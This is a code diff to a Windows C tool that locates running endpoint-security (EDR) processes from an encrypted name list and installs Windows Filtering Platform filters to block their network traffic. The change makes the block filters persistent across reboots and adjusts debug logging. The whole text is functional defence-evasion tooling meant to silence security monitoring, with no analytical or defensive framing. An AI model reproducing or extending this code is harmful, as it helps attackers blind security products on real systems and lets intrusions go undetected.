@@ -47,6 +47,9 @@ static void applyStealthFilters(HANDLE hEngine, const GUID* subLayerGuid, PCWSTR
     blockFilter.displayData.name = EDR_FILTER_NAME;
     blockFilter.displayData.description = EDR_FILTER_DESCRIPTION;
 
+    blockFilter.providerKey = (GUID*)&ProviderGUID; // Associate the filter with your provider
+    blockFilter.flags = FWPM_FILTER_FLAG_PERSISTENT;   // Make the filter persistent
+
     FWPM_FILTER_CONDITION0 blockCondition = {0};
     blockCondition.fieldKey = FWPM_CONDITION_ALE_APP_ID;
     blockCondition.matchType = FWP_MATCH_EQUAL;
@@ -159,7 +162,6 @@ void configureNetworkFilters() {
 
     for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
         decryptedNames[i] = decryptString(processData[i]);
-        PRINTF("[DEBUG] Decrypted Name #%zu: %s\n", i, decryptedNames[i] ? decryptedNames[i] : "!!--NULL--!!");
     }
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -182,6 +184,7 @@ void configureNetworkFilters() {
                     PRINTF("[+] Found EDR process: %s\n", pe32.szExeFile);
                     WCHAR fullPath[MAX_PATH];
                     if (getProcessFullPath(pe32.th32ProcessID, fullPath, MAX_PATH)) {
+                        WPRINTF(L"[DEBUG] Full Path for %hs: %s\n", pe32.szExeFile, fullPath);
                         BOOL alreadyProcessed = FALSE;
                         for (int j = 0; j < processedCount; ++j) {
                             if (lstrcmpiW(processedPaths[j], fullPath) == 0) {
